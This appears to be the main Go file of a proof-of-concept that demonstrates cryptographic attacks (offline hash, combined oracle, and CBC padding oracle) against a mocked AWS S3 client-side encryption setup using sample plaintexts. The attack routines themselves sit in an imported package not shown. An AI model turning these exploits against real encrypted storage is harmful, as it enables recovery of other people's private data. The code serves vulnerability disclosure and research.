package main

import (
	"fmt"
	"math/rand"
	"os"
	"time"

	"github.com/sophieschmieg/exploits/aws_s3_crypto_poc/exploit"
	"github.com/sophieschmieg/exploits/aws_s3_crypto_poc/mocks"
)

func main() {
	plaintextSegments := []string{
		"0123456789abcdef",
		"Hello World! Hi!",
		"This is a demo--",
		"16 byte samples ",
		"Mostly nonsenses",
	}
	plaintext := ""
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < 4; i++ {
		plaintext += plaintextSegments[rand.Intn(len(plaintextSegments))]
	}
	fmt.Printf("Challenge Plaintext:\n    %v\n\n", plaintext)

	mock, err := mocks.NewMock(mocks.GCM)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error initializing mock: %v", err)
	}

	fmt.Printf("Testing encryption and decryption works normally.\n")
	fmt.Printf("Putting object...\n")
	err = mock.PutObject("test", "test", plaintext)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error putting object: %v", err)
	}
	fmt.Printf("Getting object...\n")
	result, err := mock.GetObject("test", "test")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting object: %v", err)
	}
	fmt.Printf("Successful!\nResult:\n    %v\n", result)

	fmt.Printf("Offline hash attack:\n")
	offlineInput := &exploit.OfflineAttackInput{
		PossiblePlaintextSegments: plaintextSegments,
		S3Mock:                    *mock.S3Mock,
	}
	hashResult, err := exploit.HashExploit("test", "test", offlineInput)
	if err != nil {
		fmt.Printf("Unsuccessful: %v\n", err)
	} else {
		fmt.Printf("Successful!\n Result:\n    %v\n", hashResult)
	}

	fmt.Printf("Combined Oracle attack:\n")
	onlineInput := &exploit.OnlineAttackInput{
		PossiblePlaintextSegments: plaintextSegments,
		S3Mock:                    mock.S3Mock,
		Oracle: func(bucket string, key string) bool {
			_, err := mock.GetObject(bucket, key)
			return err == nil
		},
	}
	combinedResult, err := exploit.CombinedOracleExploit("test", "test", onlineInput)
	if err != nil {
		fmt.Printf("Unsuccessful: %v\n", err)
	} else {
		fmt.Printf("Successful!\n Result:\n    %v\n", combinedResult)
	}

	fmt.Printf("Encrypting with CBC...\n")
	mock, err = mocks.NewMock(mocks.CBC)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error initializing mock: %v", err)
	}
	err = mock.PutObject("testcbc", "test", plaintext)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error putting object: %v", err)
	}
	result, err = mock.GetObject("testcbc", "test")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting object: %v", err)
	}
	fmt.Printf("Successful!\nResult:\n    %v\n", result)

	onlineInput = &exploit.OnlineAttackInput{
		PossiblePlaintextSegments: plaintextSegments,
		S3Mock:                    mock.S3Mock,
		Oracle: func(bucket string, key string) bool {
			_, err := mock.GetObject(bucket, key)
			return err == nil
		},
	}

	fmt.Printf("Padding Oracle attack:\n")
	paddingResult, err := exploit.PaddingOracleExploit("testcbc", "test", onlineInput)
	if err != nil {
		fmt.Printf("Unsuccessful: %v\n", err)
	} else {
		fmt.Printf("Successful!\n Result:\n    %v\n", paddingResult)
	}
}
